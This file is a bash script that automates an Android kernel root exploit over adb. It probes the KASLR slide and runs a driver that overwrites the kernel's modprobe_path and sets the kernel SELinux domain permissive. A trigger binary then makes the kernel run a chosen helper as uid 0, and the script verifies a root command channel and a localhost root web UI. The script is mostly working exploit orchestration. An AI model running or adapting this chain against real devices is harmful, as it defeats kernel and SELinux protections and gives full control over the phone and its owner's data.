#!/usr/bin/env bash
# arm_root.sh - arm per-boot root + the localhost root UI over adb.
#
# Wraps the known-good chain (docs/RUN_CONFIG.md, docs/DEBUG_WORKFLOW.md):
#   1. wait for the device; re-probe the KASLR slide (unless SLIDE is given)
#   2. warm the fscrypt channel files (kernel-spawned helper cannot create files)
#   3. run the driver to write modprobe_path + mark the kernel domain permissive
#   4. exec pwn2 (4x0xFF) -> the kernel runs MPNL as uid 0
#   5. verify: mp_ran proof + the HTTP UI answers on 127.0.0.1:<PORT>
#
# Everything is one adb command per step so a panic is attributable.
# After arming, open http://127.0.0.1:<PORT>/ in Chrome ON THE DEVICE.
#
# Usage:
#   ADB=adb DRIVER=/data/local/tmp/gl MPNL=/data/local/tmp/mpnl \
#     bash scripts/arm_root.sh [SLIDE_HEX]
#
# Env: ADB, DEVICE(-s), DRIVER, MPNL, PORT (default 8080), TRIGGER.
set -uo pipefail

ADB="${ADB:-adb}"
DEVICE="${DEVICE:-}"
DRIVER="${DRIVER:-/data/local/tmp/gl}"
MPNL="${MPNL:-/data/local/tmp/mpnl}"
TRIGGER="${TRIGGER:-/data/local/tmp/pwn2}"
PORT="${PORT:-8080}"
SLIDE="${1:-${SLIDE:-}}"

A() { # one adb command
  if [ -n "$DEVICE" ]; then "$ADB" -s "$DEVICE" "$@"; else "$ADB" "$@"; fi
}
say() { printf '\n== %s ==\n' "$*"; }

say "wait for device"
"$ADB" ${DEVICE:+-s "$DEVICE"} wait-for-device 2>/dev/null || true
while [ "$(A shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do
  sleep 2
done
BOOT_ID="$(A shell cat /proc/sys/kernel/random/boot_id | tr -d '\r')"
echo "boot_id=$BOOT_ID"

if [ -z "$SLIDE" ]; then
  say "probe slide (slideprobe)"
  A shell "cd /data/local/tmp && timeout 70 ./slideprobe > sp_arm.log 2>&1; grep -a -m1 bd4 sp_arm.log"
  IP="$(A shell grep -a -m1 bd4 /data/local/tmp/sp_arm.log | tr -d '\r' | awk '{print $2}')"
  [ -n "$IP" ] || { echo "slideprobe failed"; exit 1; }
  LOW=$(( 0x${IP: -8} ))
  SLIDE=$(printf '0x%x' $(( LOW - 0x08000000 - 0x3bd4 )))
  echo "IP=$IP -> SLIDE=$SLIDE"
fi

say "warm fscrypt channel files"
A shell "cat $MPNL >/dev/null 2>&1; : > /data/local/tmp/rcmd; : > /data/local/tmp/rout; : > /data/local/tmp/mp_ran; cat /data/local/tmp/rcmd >/dev/null; cat /data/local/tmp/rout >/dev/null; cat /data/local/tmp/mp_ran >/dev/null; cat $TRIGGER >/dev/null; echo warmed"

say "run driver (write modprobe_path + permissive_map)"
A shell "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 \
  ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=$SLIDE MP_PATH=$MPNL \
  timeout 150 $DRIVER --stop-after=verify --log=info"

say "trigger root helper (pwn2)"
A shell "$TRIGGER; echo trig_rc=\$?"
sleep 3

say "verify"
A shell "cat /data/local/tmp/mp_ran 2>&1; echo '--- HTTP ---'; curl -s -m 4 -o /dev/null -w 'http=%{http_code}\n' http://127.0.0.1:$PORT/ || echo 'no HTTP'"
A shell "printf 'id\n' > /data/local/tmp/rcmd; sleep 1; cat /data/local/tmp/rout"

echo
echo "If armed: open  http://127.0.0.1:$PORT/  in Chrome on the device."
